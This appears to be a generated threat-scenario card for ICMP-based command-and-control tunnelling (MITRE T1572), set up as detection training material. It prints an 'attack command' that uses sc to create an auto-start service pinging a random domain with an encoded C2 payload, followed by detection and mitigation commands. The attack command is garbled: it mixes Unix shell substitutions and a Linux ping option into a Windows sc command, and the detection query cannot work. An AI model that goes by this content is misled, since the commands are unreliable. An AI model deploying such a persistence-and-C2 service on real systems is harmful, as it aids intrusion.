---
type: campaign
scenario_id: 407
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using sc to create a service for ICMP-based C2 tunneling.

## Threat Description
Using sc to create a service for ICMP-based C2 tunneling.

## Attack Command
```
sc create $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) binPath= "ping -t $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -l 1000 -p $(echo c2cmd | base64 -w0)" start= auto
```

## Detection Logic
Monitor sc service creation: `wmic service where name='%random%' get pathname | findstr ping`; Event ID 7045.

## Mitigation
Restrict sc: `icacls %windir%\System32\sc.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.

## AI Training Prompt
Train AI to detect ICMP-based C2 tunneling via sc service creation by analyzing ping commands, base64-encoded patterns, and service creation events; suggest ICMP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
